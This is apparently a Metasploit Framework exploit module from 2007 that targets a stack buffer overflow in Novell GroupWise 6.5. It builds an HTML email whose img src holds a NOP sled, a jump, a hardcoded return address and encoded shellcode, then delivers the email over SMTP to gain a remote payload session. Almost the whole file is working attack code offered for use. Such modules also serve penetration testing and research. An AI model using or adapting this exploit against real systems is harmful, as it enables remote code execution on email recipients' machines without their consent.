##
# $Id: novell_groupwise.rb 4845 2007-12-12 03:14:22Z famato $
##

##
# This file is part of the Metasploit Framework and may be subject to 
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/projects/Framework/
##


require 'msf/core'

module Msf

class Exploits::Windows::Email::Novell_groupwise < Msf::Exploit::Remote

	#
	# This module sends email messages via smtp
	#
	include Exploit::Remote::SMTPDeliver

	def initialize(info = {})
		super(update_info(info,
			'Name'           => 'Novell Groupwise IMG Tag Overflow',
			'Description'    => %q{
		                This module exploits a stack overflow in Novell GroupWise
			        6.5. This flaw is triggered by img tag src greater than +1000 bytes
			},
			'License'        => MSF_LICENSE,
			'Author'         => 
				[ 
					# First version 
					'Francisco Amato <famato [at] infobyte.com.ar> [ISR] www.infobyte.com.ar',   
				],
			'Version'        => '$Revision: 4845 $',
			'References'     => 
				[
					['URL', 'http://www.infobyte.com.ar/adv/ISR-16.html'],
				],
			'Stance'         => Msf::Exploit::Stance::Passive,
			'DefaultOptions' =>
				{
					'EXITFUNC' => 'process',
				},
			'Payload'        =>
				{
					'Space'       => 800,
					'EncoderType'   => Msf::Encoder::Type::AlphanumUpper,
					'BadChars' => "\x00\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x2c\x3b\x27\x20"
					
				},
			'Platform'       => 'win',
			'Targets'        =>
				[

					# #Should work for all Win2000/XP CALL ESI WTWLE61.DLL (Aug 19  1996)
					[ 'Novell Groupwise 6.5 Universal WIN2000/XP', { 'Ret' => 0x34AA6DEA}]
				],
			'DisclosureDate' => 'Dec 12 2007',
			'DefaultTarget' => 1))
			
			register_options(
				[
					OptString.new('MAILSUBJECT', [false, "The subject of the sent email"]),
					OptString.new('BODY', [false, "The body of the sent email"])					
				], self.class)	

	end

	def autofilter
		false
	end

	def exploit
		
		html ="<html><head></head><body>"
		html << datastore['BODY'] || rand_text_alphanumeric(rand(128)+1)

		src = make_nops(204) + "\xEB\x36" #jmp shellcode
		src << rand_text_alphanumeric(42,payload_badchars) #trash
		src << [target.ret].pack('V') #call esi
		src << make_nops(18) + payload.encoded # nops + shellcode
		html << "<img src='" + src +"'>"
				

		html << "</body></html>"


		msg = Rex::MIME::Message.new
		msg.mime_defaults
		msg.subject = datastore['MAILSUBJECT'] || Rex::Text.rand_text_alpha(rand(32)+1)
		msg.to = datastore['MAILTO']
		msg.from = datastore['MAILFROM']

		msg.add_part(Rex::Text.encode_base64(html, "\r\n"), "text/html", "base64", "inline")

		send_message(msg.to_s)		
		
		print_status("Waiting for a payload session (backgrounding)...")
	end


end

end
